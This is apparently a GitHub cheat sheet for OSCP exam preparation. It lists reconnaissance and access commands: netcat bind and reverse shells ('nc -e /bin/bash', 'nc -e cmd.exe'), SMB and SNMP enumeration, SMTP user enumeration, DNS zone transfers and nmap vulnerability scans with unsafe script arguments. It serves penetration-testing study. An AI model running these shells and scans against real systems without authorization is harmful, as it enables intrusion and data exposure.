# Go-For-OSCP

# Tips
<b>Enable service on every reboot:</b>

update-rc.d <[service]> enable

<b>Extract link from html page:</b>

cat index.html | grep "href=" | cut -d "/" -f3| grep "debian.org" | cut -d '"' -f1 | sort -u

# Netcat
<b>Interact with application:</b>

nc -nv <[IP]> <[PORT]>

<b>Listener:</b>

nc -nlvp <[PORT]>

<b>File transfer (client):</b>

nc -nlvp <[PORT]> > <[FILE]>

<b>File transfer (server):</b>

nc -nv <[IP]> <[PORT]> < <[FILE_TO_SEND]>

# Bind vs Reverse Shell

<img src="https://raw.github.com/SynAckPwn23/Go-For-OSCP/master/Bind_Reverse_shell.png" width="500"/>

<b>Bind Shell:</b>

Bob needs Alice's help. Bob set up a listener on port 4444 with -e parameter:

	(BOB): nc -nlvp <[PORT]> -e cmd.exe

	(ALICE): nc -nv <[BOB_IP]> <[PORT]>

<b>Reverse Shell:</b>

Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB to reach Alice. So Alice create a reverse shell:

	(ALICE): nc -nv <[BOB_IP]> <[PORT]> -e /bin/bash

	(BOB): nc -nlvp <[PORT]>

# Zone Transfer

dnsrecon -t axfr -d <[DOMAIN]>

# SMB

nbtscan <[SUBNET]>

nmap -p139,445 --script smb-enum-users <[SUBNET]>

nmap -p139,445 --script=smb-vuln-* --script-args=unsafe=1 <[SUBNET]>

enum4linux

smbclient -L <[IP]> -N

smbclient \\<[IP]>\share -N

# SNTP

nmap -p25 <[SUBNET]> --open

nc -nv IP 25

VRFY <[USERNAME]>

# SNMP

Steps: nmap scan udp 161, create target IP list, create community list file, use onesixtyone + snmpwalk

nmap -sU --open -p161 <[SUBNET]> --open

onesixtyone -c community -i <[SMNP_IP_LIST]>

snmpwalk -c public -v1 <[IP]> <mib-values>

Mib-values (for snmpwalk):

	1.3.6.1.2.1.25.1.6.0 System Processes

	1.3.6.1.2.1.25.4.2.1.2 Running Programs

	1.3.6.1.2.1.25.4.2.1.4 Processes Path

	1.3.6.1.2.1.25.2.3.1.4 Storage Units

	1.3.6.1.2.1.25.6.3.1.2 Software Name

	1.3.6.1.4.1.77.1.2.25 User

	1.3.6.1.2.1.6.13.1.3 TCP Local Ports









# Nmap
nmap -sS -sV -A -O --script="*-vuln-*" --script-args=unsafe=1 <[IP]>
